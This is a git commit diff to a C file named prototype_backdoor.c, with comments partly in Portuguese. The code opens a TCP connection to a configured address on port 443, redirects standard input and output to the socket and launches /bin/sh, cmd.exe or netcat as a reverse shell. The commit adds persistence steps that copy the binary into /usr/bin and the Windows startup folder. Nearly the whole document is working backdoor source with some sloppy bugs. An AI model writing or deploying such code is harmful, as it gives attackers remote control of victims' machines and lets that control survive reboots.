9579172089c013fe203031b98184554814dd5fb8
unknow <rmdero_jr_@outlook.com>
2017-10-19 06:57:19 -0200

    Updating!

--- prototype_backdoor.c
+++ prototype_backdoor.c
@@ -1,5 +1,7 @@
 /* prototype of backdoor wopnt. */ 
 
+/* usar system() para invocar as funções do sistema! */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -12,7 +14,7 @@
 
 #define remote_addr "127.0.0.1"
 
-#define remote_port 55661
+#define remote_port 443
 
 #define false 0
 #define true 1
@@ -32,17 +34,24 @@
     x = socket(AF_INET, SOCK_STREAM, 0);
 
     connect(x, (struct sockaddr *)&s, sizeof(s));
-    if(connect == false)
+    if(connect == false) {
     perror("connect_socket(CONNECT_STABILISHED)failed");
-
-    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+    }
+    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0) {
     perror("setsockopt(SO_REUSEADDR) failed");
-
+    }
     /* mm a for loop will be necessary, or switch case. */
 
     send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);   /* recv(); no lado server. */
 
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
+    system("cp simple_shell /usr/bin"); /* here the code will execute in the target machine
+                                             the following command. Will copy the software to
+                                             register, on linux systems.
+
+                                             Same here... */
+    system("copy /Y simple_shell.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar");
+    send(x,"\n\n[*] Copied to registry...[*]\n\n",31,0);
     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
 
     {
@@ -58,7 +67,6 @@
    int main(int argc, char *argv[])
 
    {
-     
      char option;
 
      //printf("\nLaunch the shell\n");
